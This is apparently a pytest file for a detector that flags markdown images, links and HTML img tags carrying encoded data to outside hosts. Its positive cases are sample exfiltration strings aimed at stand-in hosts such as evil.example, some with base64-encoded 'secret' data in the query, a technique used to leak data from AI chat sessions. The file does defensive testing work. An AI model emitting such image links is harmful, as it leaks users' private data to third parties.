import base64
import string

import pytest
from gauntlet_core.checks.detectors import detect_markdown_image_exfil as det
from hypothesis import given
from hypothesis import strategies as st

POSITIVE = [
    "![x](https://evil.example/pixel.png?d=c2VjcmV0LWRhdGE)",
    "![](https://evil.example/p.gif#fragment-with-long-data-123)",
    '<img src="https://evil.example/a.png?q=0123456789abcdef0123">',
    "![a][1]\n\n[1]: https://evil.example/i.png?payload=abcdefghijklmnop",
    "![x](https://good.example/" + "a1B2" * 10 + ".png)",
    "[click](https://evil.example/" + "0123456789abcdef" * 3 + ")",
    "![x](https://sub.evil.example/i?data=" + "x" * 20 + ")",
]
NEGATIVE = [
    "![logo](https://example.com/logo.png)",
    "![logo](https://example.com/logo.png?v=2)",
    "[docs](https://example.com/docs?page=1)",
    "[slug](https://blog.example.com/this-is-a-very-long-descriptive-article-slug-about-things)",
    "plain text with no links at all",
    "see https://example.com/a?b=cccccccccccccccccccccccc for more",
    "![x][missing]",
]


@pytest.mark.parametrize("text", POSITIVE)
def test_positive(text):
    assert det(text), text


@pytest.mark.parametrize("text", NEGATIVE)
def test_negative(text):
    assert det(text) == [], text


def test_allow_domain_matches_registrable_suffix():
    t = "![x](https://img.cdn.example.com/p.png?token=abcdefghijklmnopqrst)"
    assert det(t)
    assert det(t, allow_domains=["example.com"]) == []
    assert det(t, allow_domains=["other.com"])


def test_min_query_chars():
    t = "![x](https://evil.example/p.png?a=12345)"
    assert det(t) == []
    assert det(t, min_query_chars=4)


def test_encoded_run_fires_even_on_allowed_host():
    t = "![x](https://example.com/" + "Ab3" * 12 + ")"
    assert det(t, allow_domains=["example.com"])


@given(
    st.binary(min_size=24, max_size=120),
    st.text(alphabet=string.ascii_lowercase, min_size=3, max_size=10),
)
def test_generated_base64_urls_always_fire(data, host):
    b64 = base64.urlsafe_b64encode(data).decode().rstrip("=")
    assert det(f"![i](https://{host}.test/p.png?d={b64})")
